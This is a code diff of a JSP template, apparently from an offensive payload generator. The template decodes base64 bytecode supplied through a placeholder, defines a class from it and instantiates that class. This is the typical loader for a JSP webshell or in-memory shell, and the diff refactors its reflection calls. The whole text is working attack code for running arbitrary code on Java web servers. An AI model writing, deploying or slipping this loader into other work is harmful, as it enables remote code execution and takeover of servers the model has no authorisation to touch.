@@ -3,6 +3,7 @@
         public ClassDefiner(ClassLoader classLoader) {
             super(classLoader);
         }
+
         public Class<?> defineClass(byte[] code) {
             return defineClass(null, code, 0, code.length);
         }
@@ -10,18 +11,16 @@
 %>
 
 <%
-    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
     String base64Str = "{{base64Str}}";
     byte[] bytecode = null;
     try {
-        Class base64Clz = classLoader.loadClass("java.util.Base64");
-        Class decoderClz = classLoader.loadClass("java.util.Base64$Decoder");
-        Object decoder = base64Clz.getMethod("getDecoder").invoke(base64Clz);
-        bytecode = (byte[]) decoderClz.getMethod("decode", String.class).invoke(decoder, base64Str);
+        Class base64Clz = Class.forName("java.util.Base64");
+        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
+        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
     } catch (ClassNotFoundException ee) {
-        Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
-        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(datatypeConverterClz, base64Str);
+        Class datatypeConverterClz = Class.forName("javax.xml.bind.DatatypeConverter");
+        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
     }
-    Class clazz = new ClassDefiner(classLoader).defineClass(bytecode);
+    Class clazz = new ClassDefiner(Thread.currentThread().getContextClassLoader()).defineClass(bytecode);
     clazz.newInstance();
 %>
